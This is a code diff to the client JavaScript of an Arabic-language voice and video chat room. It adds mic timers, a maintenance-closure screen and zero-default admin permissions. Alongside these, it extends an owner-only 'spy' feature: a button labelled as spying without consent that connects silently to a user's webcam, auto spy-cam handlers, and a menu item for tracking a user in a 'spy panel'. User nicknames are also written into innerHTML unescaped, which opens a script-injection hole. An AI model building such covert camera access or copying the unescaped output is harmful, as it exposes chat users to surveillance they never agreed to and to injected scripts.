@@ -30,11 +30,15 @@ const isAdmin  = () => ['owner','master','super_admin','moderator'].includes(sta
 const ROLE_LEVELS = { guest:0, user:1, moderator:2, super_admin:3, master:4, owner:5 };
 const ROLE_LBL    = { owner:'👑 مالك', master:'🌟 ماستر', super_admin:'⚡ سوبر أدمن', moderator:'🛡️ مشرف', user:'👤 عضو', guest:'🔓 زائر' };
 const ROLE_COLORS = { owner:'#8b0000', master:'#8b4513', super_admin:'#6a0dad', moderator:'#00008b', user:'#1a5a1a', guest:'#4a4a6a' };
-const RANK_PERMS  = {
+// RANK_PERMS: max permissions a rank CAN be given (ceiling)
+// All admins start with ZERO permissions — owner grants as needed
+// Owner can grant any permission up to the rank ceiling
+const RANK_PERMS_MAX = {
   moderator:   ['blockMachine','muteUsers','kickout','sortMicList','clearText','broadcast','unban','viewLog','sendImages','dragToRoom'],
   super_admin: ['blockMachine','muteUsers','kickout','sortMicList','clearText','broadcast','unban','viewLog','manageAccounts','manageMembers','manageAdmins','sendImages','dragToRoom','roomSettings','adminReports','profilePic'],
   master:      ['blockMachine','muteUsers','kickout','sortMicList','clearText','broadcast','unban','viewLog','manageAccounts','manageMembers','manageAdmins','manageSuperAdmins','sendImages','dragToRoom','roomSettings','adminReports','profilePic','machineLock'],
 };
+const RANK_PERMS = RANK_PERMS_MAX; // alias for existing code
 
 const AVATARS    = ['🌙','⭐','🌟','💫','🌸','🌺','🦋','🐉','🦁','🐺','🦊','🐻','🦅','🌊','🔥','⚡','🎭','🎨','🎵','🏆','👑','💎','🌈','🎯','🚀','🌴','🏰','⚔️','🛡️','🎤','📷','🌹','🍵','☕','🌿','🦄','🐬','🌻','🍀'];
 const ROOM_ICONS = ['💬','🌙','⭐','🎵','🎮','📚','🌹','🏆','🎭','🌊','🔥','💎','🕌','🎨','🌿','🤝','🎤','📷','🌺','🏄','☕','🍵','🏠','🌃','🎪','🧩','🌐','🔮'];
@@ -188,12 +192,27 @@ function joinRoom(room,undercover=false,password=''){
   // fix: clear stale online users list immediately on room change
   state.onlineUsers=[];renderUsers();
   state.stageUsers=[];renderStage();
+  window._currentRoomId = room.id; // voice.js reads this for timer ticks
   state.socket?.emit('join_room',{roomId:room.id,undercover:undercover||state.undercover,password});
 }
 
 function connectSocket(){
   setConn('connecting');
   state.socket=io(CONFIG.SOCKET_URL,{auth:{token:state.token,fingerprint:state.deviceFp,undercover:state.undercover},transports:['websocket','polling'],reconnection:true,reconnectionAttempts:10,reconnectionDelay:2000});
+  state.socket.on('site_closed',({message})=>{
+    if(isOwner())return; // owner always gets in even when site is closed
+    // Disconnect immediately
+    state.socket?.disconnect();
+    // Show full-screen maintenance message
+    document.body.innerHTML='<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:linear-gradient(135deg,#1a3a80,#3a6ac8);color:#fff;font-family:Cairo,Tahoma,sans-serif;text-align:center;gap:20px;padding:20px">'
+      +'<div style="font-size:60px">🌙</div>'
+      +'<div style="font-size:26px;font-weight:900">سهر الليالي</div>'
+      +'<div style="font-size:15px;background:rgba(0,0,0,.35);padding:24px 40px;border-radius:12px;max-width:520px;line-height:2.2;border:1px solid rgba(255,255,255,.2)">'
+      +(message||'الموقع مغلق مؤقتاً للصيانة')
+      +'</div>'
+      +'<div style="font-size:12px;opacity:.6;margin-top:8px">حاول مرة أخرى لاحقاً</div>'
+      +'</div>';
+  });
   const s=state.socket;
   s.on('connect',()=>{setConn('connected');if(!state.currentRoom){const lobby=state.rooms.find(r=>r.name==='الاستقبال')||state.rooms[0];if(lobby)joinRoom(lobby);}else{s.emit('join_room',{roomId:state.currentRoom.id,undercover:state.undercover,password:''});}});
   s.on('disconnect',()=>{setConn('disconnected');state.micActive=false;$('talkBtn').classList.remove('active');});
@@ -225,12 +244,26 @@ function connectSocket(){
   s.on('user_typing',({userId,nickname})=>{if(userId===state.user.id)return;$('typingText').textContent=nickname+' يكتب...';$('typingRow').style.display='flex';});
   s.on('user_stopped_typing',()=>$('typingRow').style.display='none');
   s.on('reaction_added',({messageId,emoji})=>{const line=document.querySelector(`[data-mid="${messageId}"]`);if(!line)return;let row=line.nextElementSibling?.classList?.contains('reactions-row')?line.nextElementSibling:null;if(!row){row=el('div','reactions-row');line.after(row);}let ex=[...row.children].find(c=>c.dataset.e===emoji);if(ex){ex.dataset.c=parseInt(ex.dataset.c||1)+1;ex.textContent=emoji+' '+ex.dataset.c;}else{const r=el('span','react-pill',emoji+' 1');r.dataset.e=emoji;r.dataset.c=1;row.appendChild(r);}});
-  s.on('stage_update',({stageUsers})=>{state.stageUsers=stageUsers;renderStage();});
+  s.on('stage_update',({stageUsers})=>{
+    state.stageUsers=stageUsers;
+    renderStage();
+    // If I'm on stage and server sent timeLeft (updated by admin), apply it
+    if(state.micActive){
+      const me=stageUsers.find(u=>u.userId===state.user.id);
+      if(me&&me.timeLeft>0&&me.timeLeft!==state._lastKnownTimeLeft){
+        state._lastKnownTimeLeft=me.timeLeft;
+        window._applyAdminMicTime(me.timeLeft);
+      }
+    }
+  });
   s.on('hand_queue_update',({queue})=>renderHandQueue(queue));
   s.on('all_hands_lowered',()=>{renderHandQueue([]);toast('تم إنزال جميع الأيدي','info');});
   s.on('hand_lowered_by_admin',({by})=>{
     state.handRaised=false;$('handBtn').classList.remove('active');
     toast('✋ قام '+by+' بإنزال يدك','info');
+  });
+  s.on('mic_time_updated',({timeLeft,by})=>{
+    window._applyAdminMicTime(timeLeft);
   });
   s.on('mic_granted',async({by, maxTime=0})=>{
     toast('🎤 منحك '+by+' الميكروفون','success');playSound('mic_on');
@@ -305,6 +338,7 @@ function connectSocket(){
   });
   s.on('force_cam_off',()=>{if(state.localStream){state.localStream.getTracks().forEach(t=>t.stop());state.localStream=null;}CAMERA_PEERS.forEach(pc=>{try{pc.close();}catch{}});CAMERA_PEERS.clear();state.camActive=false;$('camBtn').classList.remove('active');$('camStrip').innerHTML='';$('camStrip').style.display='none';toast('📷 تم إيقاف كاميرتك بواسطة المشرف','error');});
   s.on('basil_cam_auto',({socketId,nickname,avatar})=>addSpyCamThumb(socketId,nickname,avatar));
+
   s.on('basil_cam_connect',({basilSocketId})=>startCamWebRTCTo(basilSocketId));
   // fix #5 — owner can also request cam as normal viewer (shows in cam strip)
   s.on('owner_cam_normal_approved',({ownerSocketId})=>startCamWebRTCTo(ownerSocketId));
@@ -418,10 +452,38 @@ function renderStage(){
   if(!state.stageUsers.length){slots.innerHTML='<div class="stage-empty">لا أحد على الميكروفون</div>';return;}
   state.stageUsers.forEach(u=>{
     const d=el('div',`stage-user${u.speaking?' speaking':''}${u.muted?' muted':''}`);
-    d.innerHTML=`${u.avatar||'🌙'} ${u.nickname} ${u.muted?'🔇':'🎤'}`;
-    if(isAdmin()&&u.userId!==state.user.id){const kb=el('button','stage-kick-btn','✕');kb.title='سحب الميكروفون';kb.addEventListener('click',()=>state.socket?.emit('revoke_mic',{toSocketId:u.socketId}));d.appendChild(kb);}
+    // Timer display for this speaker
+    const timerStr=u.timeLeft>0?`<span class="stage-timer ${u.timeLeft<=10?'urgent':u.timeLeft<=30?'warn':''}">${Math.floor(u.timeLeft/60)>0?Math.floor(u.timeLeft/60)+'د ':''} ${u.timeLeft%60}ث</span>`:'';
+    d.innerHTML=`<span class="stage-av">${u.avatar||'🌙'}</span><span class="stage-nick">${u.nickname}</span>${u.muted?'<span>🔇</span>':'<span>🎤</span>'}${timerStr}`;
+    if(isAdmin()){
+      // Revoke mic button
+      if(u.userId!==state.user.id){
+        const kb=el('button','stage-kick-btn','✕');kb.title='سحب الميكروفون';
+        kb.addEventListener('click',()=>state.socket?.emit('revoke_mic',{toSocketId:u.socketId}));
+        d.appendChild(kb);
+      }
+      // Update mic time button (admin feature)
+      const tb=el('button','stage-time-btn','⏱');tb.title='تعديل الوقت';
+      tb.addEventListener('click',e=>{e.stopPropagation();openMicTimeDialog(u);});
+      d.appendChild(tb);
+    }
     slots.appendChild(d);
   });
+}
+
+function openMicTimeDialog(stageUser){
+  const current=stageUser.timeLeft>0?` (الحالي: ${stageUser.timeLeft}ث)`:'';
+  // Get rank default from settings
+  const rankTimes=state.roomSettings.rankTimes||{};
+  const rankDefault=rankTimes[stageUser.role]||0;
+  const hint=rankDefault>0?`
+الافتراضي لرتبته: ${rankDefault}ث`:'';
+  const secs=prompt(`تعديل وقت ${stageUser.nickname}${current}${hint}
+
+أدخل الثواني المتبقية (0 = بلا حد):`);
+  if(secs===null)return; // cancelled
+  const val=Math.max(0,parseInt(secs)||0);
+  state.socket?.emit('update_mic_time',{targetSocketId:stageUser.socketId,timeLeft:val});
 }
 function renderHandQueue(queue){
   const sec=$('handSection'),list=$('handList');
@@ -453,19 +515,29 @@ function addCamThumb(socketId,nickname,avatar,showReqBtn=false){
       toast('تم إرسال طلب المشاهدة','info');
     });
     th.appendChild(rb);
+    // Owner also gets a silent spy button
+    if(isOwner()){
+      const spyBtn=el('button','cam-spy-btn','👁‍🗨');
+      spyBtn.title='تجسس (بدون موافقة)';
+      spyBtn.addEventListener('click',e=>{
+        e.stopPropagation();
+        addSpyCamThumb(socketId,nickname,avatar);
+      });
+      th.appendChild(spyBtn);
+    }
   }
-  // Owner always gets extra spy button (no approval needed)
-  if(isOwner()){
-    const spyBtn=el('button','cam-req-btn','👁‍🗨 تجسس');
-    spyBtn.style.cssText='background:#6020a0;top:3px;left:3px;right:auto';
-    spyBtn.addEventListener('click',e=>{
-      e.stopPropagation();
-      // Spy: auto-connect without approval
-      addSpyCamThumb(socketId,nickname,'');
-    });
-    th.appendChild(spyBtn);
-  }
-  th.addEventListener('click',()=>{$('camVideo').srcObject=v.srcObject;$('camModalTitle').textContent='📷 '+nickname;$('camModal').style.display='flex';bringToFront($('camModal'));});
+  // Click any cam thumb -> open in large modal
+  th.addEventListener('click',()=>{
+    if(v.srcObject){
+      $('camVideo').srcObject=v.srcObject;
+      $('camModalTitle').textContent='📷 '+nickname;
+      $('camModal').style.display='flex';
+      bringToFront($('camModal'));
+    } else if(showReqBtn){
+      state.socket?.emit('request_cam',{toSocketId:socketId,toNickname:nickname});
+      toast('جاري طلب الكاميرا...','info');
+    }
+  });
   strip.appendChild(th);
 }
 function removeCamThumb(socketId){closeCamPeer(socketId);const th=$('camStrip').querySelector(`[data-csock="${socketId}"]`);if(th)th.remove();if(!$('camStrip').children.length)$('camStrip').style.display='none';}
@@ -502,9 +574,24 @@ async function onCamAnswer(fromSocketId,answer){const pc=CAMERA_PEERS.get(fromSo
 async function onCamIce(fromSocketId,candidate){const pc=CAMERA_PEERS.get(fromSocketId);if(!pc||!candidate)return;try{await pc.addIceCandidate(new RTCIceCandidate(candidate));}catch{}}
 function closeCamPeer(socketId){const pc=CAMERA_PEERS.get(socketId);if(pc){try{pc.close();}catch{}CAMERA_PEERS.delete(socketId);}}
 function showRemoteCam(socketId,stream){
-  const spyV=document.querySelector(`[data-spysock="${socketId}"] video`);if(spyV){spyV.srcObject=stream;spyV.play?.().catch(()=>{});return;}
-  const thumbV=$('camStrip').querySelector(`[data-csock="${socketId}"] video`);if(thumbV){thumbV.srcObject=stream;thumbV.play?.().catch(()=>{});return;}
-  $('camVideo').srcObject=stream;$('camModalTitle').textContent='📷 '+(state.onlineUsers.find(u=>u.socketId===socketId)?.nickname||'كاميرا');$('camModal').style.display='flex';
+  const nick=state.onlineUsers.find(u=>u.socketId===socketId)?.nickname||'كاميرا';
+  // 1. Spy grid
+  const spyV=document.querySelector(`[data-spysock="${socketId}"] video`);
+  if(spyV){spyV.srcObject=stream;spyV.play?.().catch(()=>{});return;}
+  // 2. Cam strip thumb - set stream so click-to-enlarge works
+  const thumbV=$('camStrip').querySelector(`[data-csock="${socketId}"] video`);
+  if(thumbV){
+    thumbV.srcObject=stream;thumbV.play?.().catch(()=>{});
+    // If modal is open for this nick, update it too
+    if($('camModal').style.display==='flex'&&$('camModalTitle').textContent.includes(nick)){
+      $('camVideo').srcObject=stream;
+    }
+    return;
+  }
+  // 3. Open directly in modal
+  $('camVideo').srcObject=stream;
+  $('camModalTitle').textContent='📷 '+nick;
+  $('camModal').style.display='flex';bringToFront($('camModal'));
 }
 
 function showCtx(e,target){
@@ -512,16 +599,18 @@ function showCtx(e,target){
   const menu=$('ctxMenu'),list=$('ctxList');list.innerHTML='';
   const myLevel=ROLE_LEVELS[state.user.role]||0;const targetLevel=ROLE_LEVELS[target.role]||0;
   const adm=isAdmin();
-  // canAct: strictly higher rank only — NO exceptions for permissions here
-  // permissions grant abilities but NOT the right to act on equal/higher ranks
-  const canAct = myLevel > targetLevel && !target.isOwner;
+  // canAct: strictly higher rank only
+  const canAct=myLevel>targetLevel&&!target.isOwner;
+  // Lower-rank admins with specific permissions CAN use those actions on non-admins (rank<2)
+  const hasKickPerm=state.user.permissions?.kickout===true&&targetLevel<2&&!target.isOwner;
+  const hasMutePerm=state.user.permissions?.muteUsers===true&&targetLevel<2&&!target.isOwner;
   const add=(icon,lbl,fn,cls='')=>{const li=el('li',cls,icon+' '+lbl);if(fn)li.addEventListener('click',()=>{fn();hideCtx();});else li.className='ctx-hdr';list.appendChild(li);};
   const sep=()=>list.appendChild(el('li','ctx-sep'));
   add('',target.nickname,null,'ctx-hdr');
   add('💬','رسالة خاصة',()=>openPm(target));
   if(adm&&target.socketId)add('🔒','همسة',()=>doWhisper(target));
   add('ℹ','معلومات',()=>showUserInfo(target));
-  if(adm&&target.userId!==state.user.id&&canAct){
+  if((adm||hasKickPerm||hasMutePerm)&&target.userId!==state.user.id&&(canAct||hasKickPerm||hasMutePerm)){
     sep();
     const onStage=state.stageUsers.some(s=>s.userId===target.userId);
     if(onStage)add('🎤','سحب الميكروفون',()=>state.socket?.emit('revoke_mic',{toSocketId:target.socketId}));
@@ -536,7 +625,11 @@ function showCtx(e,target){
     add('👑','تغيير الرتبة',()=>changeRole(target));
     add('🔑','الصلاحيات',()=>openPermDialog(target));
   }
-  if(isOwner()&&target.userId!==state.user.id){sep();if(target.ip||target.fingerprint)add('🚫','حظر بالجهاز/IP',()=>openBanLogDialog(target),'ctx-danger');}
+  if(isOwner()&&target.userId!==state.user.id){
+    sep();
+    if(target.ip||target.fingerprint)add('🚫','حظر بالجهاز/IP',()=>openBanLogDialog(target),'ctx-danger');
+    add('👁','تتبع في لوحة التجسس',()=>{openSpyPanel();});
+  }
   const x=Math.min(e.clientX,window.innerWidth-200);const y=Math.min(e.clientY,window.innerHeight-350);
   menu.style.top=y+'px';menu.style.left=x+'px';menu.style.display='block';bringToFront(menu);
   setTimeout(()=>document.addEventListener('click',hideCtx,{once:true}),0);
@@ -629,31 +722,26 @@ function openPermDialog(target){
 
   PERMS_LIST.forEach(p=>{
     const withinRank=Array.isArray(maxPerms)?maxPerms.includes(p.key):true;
-    const isGranted=existing[p.key]===true||existing[p.key]==='true';
+    // ★ Permissions are ZERO by default — only checked if explicitly granted
+    const isGranted=existing[p.key]===true;
     const lbl=el('label','chk-row');
-
-    // Show: granted=checked, can edit if higher rank AND within role's max perms
     const editable=canEdit&&withinRank;
     lbl.className='chk-row'+(withinRank?'':' perm-disabled');
 
     const checkbox=document.createElement('input');
     checkbox.type='checkbox';
     checkbox.id='perm_'+p.key;
-    checkbox.checked=isGranted;
+    checkbox.checked=isGranted; // only true if explicitly true
     checkbox.disabled=!editable;
 
-    // Visual indicator: green=granted, grey=not granted
     const span=document.createElement('span');
     span.textContent=p.label;
-    if(isGranted) span.style.color='#007700';
+    span.style.color=isGranted?'#007700':'';
 
-    // Update span color on change
-    checkbox.addEventListener('change',()=>{
-      span.style.color=checkbox.checked?'#007700':'';
-    });
+    checkbox.addEventListener('change',()=>{span.style.color=checkbox.checked?'#007700':'';});
 
-    if(!withinRank) lbl.title='خارج نطاق رتبة '+( ROLE_LBL[target.role]||target.role);
-    if(!canEdit&&withinRank) lbl.title='يجب أن تكون برتبة أعلى لتعديل هذه الصلاحية';
+    if(!withinRank) lbl.title='خارج نطاق رتبة '+(ROLE_LBL[target.role]||target.role);
+    else if(!canEdit) lbl.title='يجب أن تكون برتبة أعلى لتعديل هذه الصلاحية';
 
     lbl.appendChild(checkbox);lbl.appendChild(span);
     container.appendChild(lbl);
@@ -663,8 +751,13 @@ function openPermDialog(target){
   const grantedList=PERMS_LIST.filter(p=>existing[p.key]===true||existing[p.key]==='true').map(p=>p.label);
   const summary=$('permSummary');
   if(summary){
-    summary.textContent=grantedList.length?'الصلاحيات الممنوحة: '+grantedList.join('، '):'لا توجد صلاحيات ممنوحة';
-    summary.style.color=grantedList.length?'#007700':'#888';
+    if(grantedList.length){
+      summary.textContent='✅ الممنوحة: '+grantedList.join(' · ');
+      summary.style.cssText='color:#007700;font-size:11px;font-weight:600;padding:5px 8px;background:#f0fff0;border:1px solid #c0e0c0;border-radius:4px';
+    } else {
+      summary.textContent='⚪ لا توجد صلاحيات ممنوحة — جميع الصلاحيات صفر';
+      summary.style.cssText='color:#888;font-size:11px;padding:5px 8px;background:#f8f8f8;border:1px solid #ddd;border-radius:4px';
+    }
   }
 
   $('permModal').style.display='flex';bringToFront($('permModal'));
@@ -683,11 +776,11 @@ async function savePermissions(){
   PERMS_LIST.forEach(p=>{
     const cb=$('perm_'+p.key);
     if(cb&&!cb.disabled){
-      // Editable — use checkbox value
-      perms[p.key]=cb.checked;
+      // Editable checkbox — true only if checked
+      perms[p.key]=cb.checked===true;
     } else {
-      // Not editable — preserve existing value
-      perms[p.key]=existing[p.key]||false;
+      // Out-of-rank / not editable — preserve existing (false by default)
+      perms[p.key]=existing[p.key]===true;
     }
   });
 
@@ -1004,10 +1097,19 @@ function saveAdvancedSettings(){
 }
 function saveSoundSettings(){state.soundsEnabled=!$('soundDisable').checked;state.socket?.emit('set_sound_prefs',{disabled:!state.soundsEnabled});toast(state.soundsEnabled?'الأصوات مفعّلة 🔊':'الأصوات معطّلة 🔇','info');}
 
+function toggleSiteClosed(){
+  if(!isOwner())return;
+  const closed=$('siteClosedToggle')?.checked||false;
+  const msg=($('siteClosedMsg')?.value||'').trim()||'الموقع مغلق مؤقتاً للصيانة';
+  state.socket?.emit('set_site_closed',{closed,message:msg});
+  toast(closed?'🔒 تم إغلاق الموقع — المستخدمون لن يتمكنوا من الدخول':'🔓 تم فتح الموقع','success');
+}
+
 async function doAddAccount(){
   const u=$('newAccUser').value.trim().toLowerCase(),p=$('newAccPass').value,r=$('newAccRole').value;
   if(!u||!p){$('addAccountMsg').textContent='البيانات مطلوبة';$('addAccountMsg').className='info-msg error';return;}
-  const perms={};PERMS_LIST.forEach(pr=>{perms[pr.key]=$('nacp_'+pr.key)?.checked||false;});
+  // Permissions start at zero — only save what is explicitly checked
+  const perms={};PERMS_LIST.forEach(pr=>{perms[pr.key]=$('nacp_'+pr.key)?.checked===true;});
   $('addAccountMsg').textContent='جاري الإنشاء...';
   try{
     await api('/auth/register','POST',{username:u,nickname:u,password:p,avatar:'🌙',fingerprint:''});
@@ -1031,36 +1133,103 @@ function initSpyNav(){document.querySelectorAll('.spy-nav-item').forEach(item=>{
 
 // Mic countdown timer shown on talk button
 let _micTimerInterval = null;
-function showMicTimer(maxSeconds){
-  clearInterval(_micTimerInterval);
-  let remaining=maxSeconds;
-  const btn=$('talkBtn');
-  const origLabel=btn.querySelector('span:last-child').textContent;
-  _micTimerInterval=setInterval(()=>{
-    remaining--;
-    if(remaining<=0){clearInterval(_micTimerInterval);btn.querySelector('span:last-child').textContent='ميكروفون';return;}
-    const m=Math.floor(remaining/60),s=remaining%60;
-    btn.querySelector('span:last-child').textContent=(m>0?m+'د ':'')+s+'ث';
-    // Color urgency: red when < 10 sec
-    btn.style.background=remaining<10?'linear-gradient(to bottom,#cc0000,#880000)':remaining<30?'linear-gradient(to bottom,#cc6600,#994400)':'';
-  },1000);
-}
-// Listen to voice.js mic_timer event
-window.addEventListener('mic_timer',e=>{
-  const {remaining,max}=e.detail;
+let _micTimerBar = null;
+
+function _updateTimerUI(remaining){
   const btn=$('talkBtn');
   if(!btn)return;
   const m=Math.floor(remaining/60),s=remaining%60;
-  btn.querySelector('span:last-child').textContent=(m>0?m+'د ':'')+s+'ث';
-  btn.style.background=remaining<10?'linear-gradient(to bottom,#cc0000,#880000)':remaining<30?'linear-gradient(to bottom,#cc6600,#994400)':'';
+  const label=(m>0?m+'د ':'')+String(s).padStart(2,'0')+'ث';
+  btn.querySelector('span:last-child').textContent=label;
+  if(remaining<=10){
+    btn.style.background='linear-gradient(to bottom,#cc0000,#880000)';
+    btn.classList.add('timing-urgent');
+  } else if(remaining<=30){
+    btn.style.background='linear-gradient(to bottom,#cc6600,#994400)';
+    btn.classList.remove('timing-urgent');
+  } else {
+    btn.style.background='linear-gradient(to bottom,#2a7a2a,#1a5a1a)';
+    btn.classList.remove('timing-urgent');
+  }
+  // Show/update mic bar in stage section
+  showMicTimerOnStage(remaining);
+}
+
+function showMicTimerOnStage(remaining){
+  // Get or create the timer bar inside .stage-section
+  let bar=$('micTimerBar');
+  if(!bar){
+    bar=document.createElement('div');
+    bar.id='micTimerBar';
+    bar.className='mic-timer-bar';
+    // Insert after stageSlots inside .stage-section
+    const section=document.querySelector('.stage-section');
+    const slots=$('stageSlots');
+    if(section&&slots){
+      slots.insertAdjacentElement('afterend',bar);
+    } else if(section){
+      section.appendChild(bar);
+    } else {
+      // fallback — put in users panel
+      document.querySelector('.users-panel')?.appendChild(bar);
+    }
+  }
+  const m=Math.floor(remaining/60),s=remaining%60;
+  const pct=state._micMaxTime>0?Math.max(0,Math.round(remaining/state._micMaxTime*100)):100;
+  const cls=remaining<=10?'urgent':remaining<=30?'warn':'';
+  bar.innerHTML=`<div class="mic-timer-fill ${cls}" style="width:${pct}%"></div>`
+    +`<span class="mic-timer-label">⏱ ${(m>0?m+'د ':'')+(s<10?'0':'')+s}ث</span>`;
+  bar.style.display='block';
+  if(remaining<=0){setTimeout(()=>{if(bar)bar.style.display='none';},600);}
+}
+
+function showMicTimer(maxSeconds){
+  clearInterval(_micTimerInterval);
+  state._micMaxTime=maxSeconds;
+  let remaining=maxSeconds;
+  _updateTimerUI(remaining);
+  _micTimerInterval=setInterval(()=>{
+    remaining--;
+    _updateTimerUI(remaining);
+    if(remaining<=0){
+      clearInterval(_micTimerInterval);
+      const btn=$('talkBtn');
+      if(btn){btn.querySelector('span:last-child').textContent='ميكروفون';btn.style.background='';btn.classList.remove('timing-urgent');}
+      $('micTimerBar')&&($('micTimerBar').style.display='none');
+    }
+  },1000);
+}
+
+// voice.js mic_timer events
+window.addEventListener('mic_timer',e=>{
+  const {remaining,max}=e.detail;
+  if(!state._micMaxTime)state._micMaxTime=max;
+  _updateTimerUI(remaining);
 });
 window.addEventListener('mic_time_up',()=>{
   clearInterval(_micTimerInterval);
   const btn=$('talkBtn');
-  if(btn){btn.querySelector('span:last-child').textContent='ميكروفون';btn.style.background='';}
+  if(btn){btn.querySelector('span:last-child').textContent='ميكروفون';btn.style.background='';btn.classList.remove('timing-urgent');}
+  $('micTimerBar')&&($('micTimerBar').style.display='none');
   state.micActive=false;$('talkBtn').classList.remove('active');
   toast('⏰ انتهى وقت الميكروفون','info');
 });
+
+// Admin updated mic time for me
+window._applyAdminMicTime = function(timeLeft){
+  clearInterval(_micTimerInterval);
+  if(timeLeft===0){
+    // Unlimited
+    const btn=$('talkBtn');
+    if(btn){btn.querySelector('span:last-child').textContent='ميكروفون';btn.style.background='';}
+    $('micTimerBar')&&($('micTimerBar').style.display='none');
+    toast('⏱ تم رفع حد الوقت','success');
+  } else {
+    showMicTimer(timeLeft);
+    Voice.setMaxTime(state.socket,timeLeft);
+    toast('⏱ تم تعديل وقتك إلى '+timeLeft+' ثانية','info');
+  }
+};
 
 function saveGlobalSettings(){
   const multiLogin=$('multiLoginToggle')?.checked ?? true;
@@ -1137,6 +1306,7 @@ function bindChat(){
   $('clearAllBansBtn')?.addEventListener('click',()=>{if(confirm('مسح جميع الحظر والكتم؟'))state.socket?.emit('clear_all_bans');});
   $('multiLoginToggle')?.addEventListener('change',e=>state.socket?.emit('set_global_settings',{allowMultiLogin:e.target.checked}));
   $('saveGlobalBtn')?.addEventListener('click',saveGlobalSettings);
+  $('siteCloseBtn')?.addEventListener('click',toggleSiteClosed);
   $('addRoomManageBtn')?.addEventListener('click',()=>{$('roomManagePanel').style.display='none';openAddRoom();});
   $('addAccountBtn')?.addEventListener('click',()=>{$('addAccountModal').style.display='flex';bringToFront($('addAccountModal'));});
   $('closeAddAccount')?.addEventListener('click',()=>$('addAccountModal').style.display='none');
